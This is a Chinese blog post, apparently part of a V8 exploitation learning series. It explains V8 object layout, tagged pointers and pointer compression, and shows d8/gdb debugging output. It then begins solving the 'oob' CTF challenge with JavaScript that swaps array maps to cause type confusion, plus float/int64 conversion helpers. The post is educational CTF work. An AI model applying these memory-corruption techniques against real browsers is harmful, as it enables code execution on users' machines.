@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="继续。 主要参考blog：传送门  B. JSObject 在实际的chrome v8 pwn题中，漏洞绝大多数都是类型混淆，实际上近年的chrome v8 CVE也绝大多数是由于类型混淆引起的。因此我们有必要理解究竟什么叫类型混淆。  B.1 JSReceiver 在v8源代码中，定义了一个JSObject类，这是所有JS类型的父类，如JSDate日期类型、JSRegExp正则表达式类型等全都是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="chrome v8 pwn 学习 (2)">
+<meta property="og:url" content="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/index.html">
+<meta property="og:site_name" content="CoLin&#39;s BLOG">
+<meta property="og:description" content="继续。 主要参考blog：传送门  B. JSObject 在实际的chrome v8 pwn题中，漏洞绝大多数都是类型混淆，实际上近年的chrome v8 CVE也绝大多数是由于类型混淆引起的。因此我们有必要理解究竟什么叫类型混淆。  B.1 JSReceiver 在v8源代码中，定义了一个JSObject类，这是所有JS类型的父类，如JSDate日期类型、JSRegExp正则表达式类型等全都是">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/1.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/2.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/3.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/4.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/5.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/6.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/7.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/8.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/9.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/10.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/12.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/13.png">
+<meta property="og:image" content="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/14.png">
+<meta property="article:published_time" content="2024-12-10T05:45:18.000Z">
+<meta property="article:modified_time" content="2024-12-12T13:24:38.456Z">
+<meta property="article:author" content="CoLin">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/1.png">
+
+<link rel="canonical" href="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>chrome v8 pwn 学习 (2) | CoLin's BLOG</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CoLin's BLOG</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          chrome v8 pwn 学习 (2)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-12-10 13:45:18" itemprop="dateCreated datePublished" datetime="2024-12-10T13:45:18+08:00">2024-12-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-12-12 21:24:38" itemprop="dateModified" datetime="2024-12-12T21:24:38+08:00">2024-12-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/v8%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">v8系列</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>24k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>21 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>继续。</p>
+<p>主要参考blog：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/203721.html">传送门</a></p>
+<h1 id="b-jsobject"><a class="markdownIt-Anchor" href="#b-jsobject"></a> B. JSObject</h1>
+<p>在实际的chrome v8 pwn题中，漏洞绝大多数都是类型混淆，实际上近年的chrome v8 CVE也绝大多数是由于类型混淆引起的。因此我们有必要理解究竟什么叫类型混淆。</p>
+<h2 id="b1-jsreceiver"><a class="markdownIt-Anchor" href="#b1-jsreceiver"></a> B.1 JSReceiver</h2>
+<p>在v8源代码中，定义了一个<code>JSObject</code>类，这是所有JS类型的父类，如<code>JSDate</code>日期类型、<code>JSRegExp</code>正则表达式类型等全都是它的子类。<code>JSObject</code>继承自<code>JSReceiver</code>，后者定义了一些属性：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v8 13.3.0, objects/js-objects.h, line 45</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSReceiver</span> : <span class="keyword">public</span> TorqueGeneratedJSReceiver&lt;JSReceiver, HeapObject&gt; &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  NEVER_READ_ONLY_SPACE</span><br><span class="line">  <span class="comment">// Returns true if there is no slow (ie, dictionary) backing store.</span></span><br><span class="line">  <span class="built_in">DECL_GETTER</span>(HasFastProperties, <span class="type">bool</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns the properties array backing store if it</span></span><br><span class="line">  <span class="comment">// exists. Otherwise, returns an empty_property_array when there&#x27;s a</span></span><br><span class="line">  <span class="comment">// Smi (hash code) or an empty_fixed_array for a fast properties</span></span><br><span class="line">  <span class="comment">// map.</span></span><br><span class="line">  <span class="built_in">DECL_GETTER</span>(property_array, Tagged&lt;PropertyArray&gt;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Gets slow properties for non-global objects (if</span></span><br><span class="line">  <span class="comment">// v8_enable_swiss_name_dictionary is not set).</span></span><br><span class="line">  <span class="built_in">DECL_GETTER</span>(property_dictionary, Tagged&lt;NameDictionary&gt;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Gets slow properties for non-global objects (if</span></span><br><span class="line">  <span class="comment">// v8_enable_swiss_name_dictionary is set).</span></span><br><span class="line">  <span class="built_in">DECL_GETTER</span>(property_dictionary_swiss, Tagged&lt;SwissNameDictionary&gt;)</span><br></pre></td></tr></table></figure>
+<p>这里的宏字面含义理解就是定义属性以及其对应的getter，第一个参数是成员名，第二个参数是类型。这里我们首先关注第二个：</p>
+<p><code>Tagged&lt;PropertyArray&gt; property_array</code></p>
+<p>这个<code>Tagged</code>可以理解为一个简单的封装，源码中的注释如是说：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Tagged&lt;T&gt; represents an uncompressed V8 tagged pointer.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The tagged pointer is a pointer-sized value with a tag in the LSB. The value</span></span><br><span class="line"><span class="comment">// is either:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//   * A small integer (Smi), shifted right, with the tag set to 0</span></span><br><span class="line"><span class="comment">//   * A strong pointer to an object on the V8 heap, with the tag set to 01</span></span><br><span class="line"><span class="comment">//   * A weak pointer to an object on the V8 heap, with the tag set to 11</span></span><br><span class="line"><span class="comment">//   * A cleared weak pointer, with the value 11</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The exact encoding differs depending on 32- vs 64-bit architectures, and in</span></span><br><span class="line"><span class="comment">// the latter case, whether or not pointer compression is enabled.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// On 32-bit architectures, this is:</span></span><br><span class="line"><span class="comment">//             |----- 32 bits -----|</span></span><br><span class="line"><span class="comment">// Pointer:    |______address____w1|</span></span><br><span class="line"><span class="comment">//    Smi:     |____int31_value___0|</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// On 64-bit architectures with pointer compression:</span></span><br><span class="line"><span class="comment">//             |----- 32 bits -----|----- 32 bits -----|</span></span><br><span class="line"><span class="comment">// Pointer:    |________base_______|______offset_____w1|</span></span><br><span class="line"><span class="comment">//    Smi:     |......garbage......|____int31_value___0|</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// On 64-bit architectures without pointer compression:</span></span><br><span class="line"><span class="comment">//             |----- 32 bits -----|----- 32 bits -----|</span></span><br><span class="line"><span class="comment">// Pointer:    |________________address______________w1|</span></span><br><span class="line"><span class="comment">//    Smi:     |____int32_value____|00...............00|</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// where `w` is the &quot;weak&quot; bit.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// We specialise Tagged separately for Object, Smi and HeapObject, and then all</span></span><br><span class="line"><span class="comment">// other types T, so that:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//                    Tagged&lt;Object&gt; -&gt; StrongTaggedBase</span></span><br><span class="line"><span class="comment">//                       Tagged&lt;Smi&gt; -&gt; StrongTaggedBase</span></span><br><span class="line"><span class="comment">//   Tagged&lt;T&gt; -&gt; Tagged&lt;HeapObject&gt; -&gt; StrongTaggedBase</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// We also specialize it separately for MaybeWeak types, with a parallel</span></span><br><span class="line"><span class="comment">// hierarchy:</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//                               Tagged&lt;MaybeWeak&lt;Object&gt;&gt; -&gt; WeakTaggedBase</span></span><br><span class="line"><span class="comment">//                                  Tagged&lt;MaybeWeak&lt;Smi&gt;&gt; -&gt; WeakTaggedBase</span></span><br><span class="line"><span class="comment">//   Tagged&lt;MaybeWeak&lt;T&gt;&gt; -&gt; Tagged&lt;MaybeWeak&lt;HeapObject&gt;&gt; -&gt; WeakTaggedBase</span></span><br></pre></td></tr></table></figure>
+<p>可见，这个类型实际上是一个地址的封装，它会在地址的最低2个bit添加标志位，00代表小整数，01代表一个指向堆中JS对象的强指针，10代表一个指向堆中JS对象的弱指针，11代表被清理的弱指针。强指针和弱指针应该是对应于JS中的强引用和弱引用，只有强引用才能左右一个对象的生命周期，当对象的所有强引用被销毁时，该对象就会被销毁，不会考虑是否存在弱引用。不过一般的题目中都是强引用，这里仅做了解。</p>
+<p>了解完<code>Tagged</code>之后，我们看到上面有3个<code>Tagged</code>类型，其中封装的类型分别为：<code>PropertyArray</code>、<code>NameDictionary</code>和<code>SwissNameDictionary</code>，后面两者通过查看其父类可知是哈希表类型，而第一个貌似是数组，但是具体的数据排布方式未知。下面我们通过调试探究一下。</p>
+<h2 id="b2-how-to-debug-d8"><a class="markdownIt-Anchor" href="#b2-how-to-debug-d8"></a> B.2 How to DEBUG d8</h2>
+<p>在调试版的d8中，可以在运行时指定参数<code>--allow-natives-syntax</code>，这样在JS代码中可以通过<code>%DebugPrint(...)</code>的方式打印一个对象的底层信息，通过<code>%SystemBreak()</code>发送断点信号，方便我们通过gdb进行调试。</p>
+<p><img src="1.png" alt="" /></p>
+<p>上图可知，这里对于一个浮点数的数组给出了很多信息。我们移步gdb查看一下：</p>
+<p>从上面的图中，我们找到对象所在的地址为0x16e200288468，最后一个1是标志位忽略。下面是这个对象在内存中的布局：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x16e200288460</span><br><span class="line">00:0000│  0x16e200288460 ◂— 0x99447536c9d5a</span><br><span class="line">01:0008│  0x16e200288468 ◂— 0x7450008cf81</span><br><span class="line">02:0010│  0x16e200288470 ◂— 0x6000994f5</span><br><span class="line">03:0018│  0x16e200288478 ◂— 0xbab932000000b5</span><br></pre></td></tr></table></figure>
+<p>这就是这个对象的全部内容。很奇怪对吗，为什么这里没有任何指针呢？诶这就要提到v8中的指针压缩技术了。如果开启了v8的指针压缩，那么所有的v8对象都会被存放在一个4GB大小的内存空间中，由于此时所有的对象地址的高32位都相同，所以在对象实际存储时就不需要高32位，仅需保存低32位即可。这样的话我们就可以理解上面这一小段内存的含义了。</p>
+<ul>
+<li><code> - map: 0x16e20008cf81 &lt;Map[16](PACKED_SMI_ELEMENTS)&gt; [FastProperties]</code>：对应的是0x16e200288468开头的4字节空间，代表这个对象的类型。</li>
+<li><code> - prototype: 0x16e20008d1f5 &lt;JSArray[0]&gt;</code>：和map对应，是这个对象的原型。</li>
+<li><code> - elements: 0x16e2000994f5 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</code>：对应的是0x16e200288470开头的4字节空间，代表数组元素的保存地址。</li>
+<li><code> - length: 3</code>：长度，常数，保存在0x16e200288474开头的4字节空间，因为最低位被保存为0所以只有高31位用于保存整数，表现在内存中即为6。</li>
+<li><code> - properties: 0x16e200000745 &lt;FixedArray[0]&gt;</code>：属性数组，即前面的<code>PropertyArray</code>，对应0x16e20028846c开头的4字节空间，保存这个类型的属性。</li>
+</ul>
+<p>下面我们再看一下<code>elements</code>中的数组元素是如何保存的：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; tele 0x16e2000994f0</span><br><span class="line">00:0000│  0x16e2000994f0 ◂— 0x67d00002d29 /* &#x27;)-&#x27; */</span><br><span class="line">01:0008│  0x16e2000994f8 ◂— 0x200000006</span><br><span class="line">02:0010│  0x16e200099500 ◂— 0x600000004</span><br></pre></td></tr></table></figure>
+<p>也是很好理解：</p>
+<ul>
+<li>0x16e2000994f4开头的4字节空间是map，用于指明类型</li>
+<li>0x16e2000994f8开头的4字节空间是整数3，表示数组长度</li>
+<li>后面的3个32位类型就是数组的内容，分别为1、2、3。</li>
+</ul>
+<p>在新版本中，默认是开启指针压缩的，因为能够提升执行效率。在上一篇blog中提到的那道2019年的赛题使用的版本中，默认就没有开启，所以内存中就直接保存了真实的64位内存地址。</p>
+<p>由此，我们就能够解释上一篇blog中<code>oob</code>函数输出的浮点数究竟代表什么东西了。</p>
+<p>在release版本中我们同样可以使用<code>--allow-natives-syntax</code>参数，不过只能输出对象所在的地址。但是v8提供了一个gdb脚本可以用于输出对象信息，位于<code>tools/gdbinit</code>，将其添加到<code>~/.gdbinit</code>中即可。</p>
+<p>下面是调试结果：</p>
+<p><img src="2.png" alt="" /></p>
+<p>可以看到这里的输出是2.65365992014225e-310。我们查看一下<code>elements</code>：</p>
+<p><img src="3.png" alt="" /></p>
+<p>可以看到，如果我们将数组后面那个地方视作浮点数的话，结果的值与输出完全相同。因此这里泄露的就是一个内存地址。经过简单的观察发现，这里实际上就是我们的浮点数数组对象的位置，这里保存的就是一个map。即保存数组元素的位置正好在对象的低地址处。因为<code>oob</code>函数如果传入参数，是可以溢出写入的，而这里又是标志一个对象类型的重要结构。如果我们将这个地方成功修改，那么JS解释器就会出现类型混淆的漏洞。</p>
+<p>注：Map类在<code>objects/map.h</code>中也有详细的字段数据结构分析，感兴趣可以移步研究。</p>
+<h1 id="c-chrome-v8-first-blood"><a class="markdownIt-Anchor" href="#c-chrome-v8-first-blood"></a> C. Chrome V8 First Blood</h1>
+<p>下面，我们就利用刚刚对于chrome v8相关内容的理解，彻底做出oob这道题。</p>
+<h2 id="c1-type-confusion"><a class="markdownIt-Anchor" href="#c1-type-confusion"></a> C.1 Type Confusion</h2>
+<p>前面提到，这道题我们可以实现对对象map实例的读或写，下面我们来解释一下如何通过这两个操作完成对任意地址的读写。</p>
+<p>首先我们知道，Object在JS中很常用，JS可以定义一个Object数组。但Object包含的东西太多，这些东西占用的内存大小各不相同，如果要将其整合到一个数组中，那么数组必然只能保存一个指针值。而浮点数数组中保存的浮点数也是8个字节长度。因此如果将Object数组混淆为浮点数数组，那么我们就可以通过直接输出的方式获取到指针值对应的浮点数。</p>
+<p>考虑下面的JS代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> first_object = &#123;<span class="string">&quot;1&quot;</span>: <span class="number">2</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> second_object = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_arr = [first_object, second_object];</span><br><span class="line"><span class="keyword">var</span> float_arr = [<span class="number">0.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// %DebugPrint(obj_arr);</span></span><br><span class="line"><span class="comment">// %DebugPrint(float_arr);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_typemap = float_arr.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> obj_typemap = obj_arr.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line">obj_arr.<span class="title function_">oob</span>(float_typemap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br></pre></td></tr></table></figure>
+<p>这里我们定义了两个数组，一个是对象数组而另一个是浮点数数组。执行完两个<code>oob</code>函数之后，我们就获得了两个map指针的浮点数表示。注意这里有一个细节，如果代码写成下面的格式，我们获取到的对象数组的map地址是错误的：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj_arr = [&#123;<span class="string">&quot;1&quot;</span>: <span class="number">2</span>&#125;, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]];</span><br><span class="line"><span class="keyword">var</span> float_arr = [<span class="number">0.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// %DebugPrint(obj_arr);</span></span><br><span class="line"><span class="comment">// %DebugPrint(float_arr);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_typemap = float_arr.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> obj_typemap = obj_arr.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line">obj_arr.<span class="title function_">oob</span>(float_typemap);</span><br><span class="line"></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br></pre></td></tr></table></figure>
+<p>因为v8维护自己的对象堆空间，所有的对象都会保存在单独的通过mmap分配出来的空间，而不是v8本身的堆空间。上面两段代码的唯一区别就是是否将对象数组中的两个对象提前定义出来。这会导致v8创建对象的顺序不同。对于前者，v8会首先创建两个对象，然后在需要创建对象数组时，首先创建固定长度的数组用于保存对象，再创建对象数组<code>obj_arr</code>并将其中的数组指针指向那个固定长度的数组，这样就能够保证定长数组与<code>obj_arr</code>之间没有其他东西，然而如果使用下面的代码，v8会首先分配定长数组空间，然后定义两个对象，最后为<code>obj_arr</code>分配空间，这样我们<code>obj_arr.oob()</code>得到的就不是<code>obj_arr</code>的map。</p>
+<h2 id="c2-object-address"><a class="markdownIt-Anchor" href="#c2-object-address"></a> C.2 Object &amp;&amp; Address</h2>
+<p>讨论完这个细节之后，我们可以看到，<code>obj_arr.oob(float_typemap);</code>这一句就能够成功将原来的对象数组解析成浮点数数组，对象数组中的指针会被v8错误地解析为浮点数。由此，我们可以编写<strong>获取任意对象地址/将任意地址伪造为对象</strong>的JS代码。不过在此之前，我们需要首先研究一下Javascript的数字类型表示。</p>
+<p>众所周知，Javascript对于所有除了BigInt的数都是使用浮点数表示的。通过将对象数组混淆为浮点数数组，我们可以通过获取浮点数的方式获取对象地址，但如果要想将任何一个整数表示的地址写入浮点数数组，就需要进行一定的处理。我们需要解决的是下面的问题：</p>
+<p><strong>对于一个8字节整数值注入，如何使用Javascript代码将其转化为浮点数，使得输入的整数与输出的浮点数在内存中的表示值相同。</strong></p>
+<p>这个问题，我们可以通过下面的JS代码解决：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> overlapping_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">var</span> for_double_value = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(overlapping_buf);</span><br><span class="line"><span class="keyword">var</span> for_bigint_value = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(overlapping_buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">double_to_int64</span>(<span class="params">double_value</span>) &#123;</span><br><span class="line">    for_double_value[<span class="number">0</span>] = double_value;</span><br><span class="line">    <span class="keyword">return</span> for_bigint_value[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">int64_to_double</span>(<span class="params">int64_value</span>) &#123;</span><br><span class="line">    for_bigint_value[<span class="number">0</span>] = int64_value;</span><br><span class="line">    <span class="keyword">return</span> for_double_value[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
